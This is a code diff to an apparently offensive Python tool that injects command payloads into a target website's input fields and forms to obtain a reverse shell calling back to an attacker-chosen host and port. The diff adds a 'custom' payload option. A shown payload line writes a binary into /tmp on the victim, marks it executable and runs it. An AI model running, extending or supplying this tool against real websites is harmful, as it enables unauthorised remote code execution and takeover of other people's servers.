@@ -22,16 +22,19 @@ def comma_separated(names):
     return names.split(',')
 
 
-PAYLOAD_TYPES = ['shell', 'binshell', 'stager']
+PAYLOAD_TYPES = ['shell', 'binshell', 'stager', 'custom']
 
 parser.add_argument('target_url', help='Target URL')
 parser.add_argument('-lhost', '--lhost', help='Server ip the payload connects to', default='127.0.0.1')
 parser.add_argument('-lport', '--lport', help="Port the payload connects to", default='80')
 parser.add_argument('-ptype', '--ptype', help=f"Port of the server the payload connects to: {', '.join(PAYLOAD_TYPES)}", default='shell')
+parser.add_argument('-payload', '--payload', help="if ptype is custom, provide your own string to inject", default=None)
 parser.add_argument('-names', type=comma_separated, help="Comma-separated list of names to inject (website input points of your choosing)", default=[])
 parser.add_argument('-v', '--verbose', action='store_true', help='Increase output verbosity')
 
 args = parser.parse_args()
+
+print('ARGS', args)
 
 print(f"target_url: {args.target_url}")
 
@@ -48,11 +51,18 @@ if args.ptype not in PAYLOAD_TYPES:
     print(f"-ptype should be one of [{', '.join(PAYLOAD_TYPES)}]")
     exit(1)
 
+if args.ptype == 'custom' and not args.payload:
+    print("\n")
+    print("-ptype is set to custom but no payload is provided")
+    exit(1)
+
 if "http" not in args.target_url:
+    print("\n")
     print("No protocol specified")
     exit(1)
 
 if not args.lhost:
+    print("\n")
     print("No -lhost specified")
     exit(1)
 
@@ -94,10 +104,8 @@ try:
         pl_bin = generator.ir_bin()
         n = randword(4)
         pl = f'printf "{pl_bin}" > /tmp/{n} && chmod +x /tmp/{n} && /tmp/{n}'
-    elif args.ptype == 'nc':  # todo
-        pass
     elif args.ptype == 'custom':  # todo
-        pass
+        pl = args.payload
 
     if monkey.get_forms():
         print("Injecting via forms")
@@ -114,8 +122,9 @@ try:
 
     if not has_shell:
         print("\n")
-        print("Failed :(")
-        print("Try a different payload type")
+        if not args.payload:  # if we don't care about output
+            print("Failed :(")
+            print("Try a different payload type")
 
 except KeyboardInterrupt:  # ctrl-c
-    sys.exit(0)
+    quit()
